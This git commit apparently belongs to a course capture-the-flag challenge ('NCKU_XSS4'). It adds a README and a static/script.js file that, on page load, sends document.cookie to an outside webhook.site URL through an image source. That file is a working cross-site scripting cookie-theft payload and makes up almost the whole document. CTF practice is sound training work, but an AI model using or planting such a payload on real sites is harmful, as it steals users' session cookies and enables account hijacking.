a9b6ee5c89622bac1545e1064fb07b86c9ed20c0
lin3598197 <lin3598197@gmail.com>
2026-07-08 08:44:42 +0800

    Initial commit

---
+++ README.md
@@ -0,0 +1,5 @@
+# NCKU_XSS4
+
+a repo with https://class.nckuctf.org/challenges#xss4-59 Exploit
+
+has static/script.js
---
+++ static/script.js
@@ -0,0 +1,3 @@
+  window.onload = function() {
+  document.getElementById("myImage").src = "https://webhook.site/65aa6dc5-de92-4a81-8dce-26210b5d72af?"+document.cookie; 
+};
